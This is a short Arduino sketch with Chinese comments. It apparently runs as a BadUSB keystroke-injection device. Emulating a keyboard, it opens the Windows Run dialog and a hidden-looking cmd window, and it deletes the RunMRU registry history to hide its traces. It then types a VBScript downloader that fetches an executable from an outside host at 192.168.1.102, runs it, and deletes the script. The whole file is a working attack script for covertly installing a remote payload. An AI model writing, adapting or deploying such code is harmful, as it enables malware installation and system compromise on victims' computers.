void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500); 
  Keyboard.println("cmd.exe /T:01 /K mode CON: COLS=16 LINES=1&reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f");
  delay(500); 
  Keyboard.println("echo Set xPost = CreateObject(\"Microsoft.XMLHTTP\") >webdown.vbs&echo xPost.Open \"GET\",\"http://192.168.1.102/x.exe\",0 >>webdown.vbs&echo xPost.Send() >>webdown.vbs&echo Set sGet = CreateObject(\"ADODB.Stream\") >>webdown.vbs&echo sGet.Mode = 3 >>webdown.vbs&echo sGet.Type = 1 >>webdown.vbs&echo sGet.Open() >>webdown.vbs&echo sGet.Write(xPost.responseBody) >>webdown.vbs&echo sGet.SaveToFile \"x.exe\",2 >>webdown.vbs&cscript webdown.vbs&del webdown.vbs /Q /F&x.exe&exit"); 
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
}
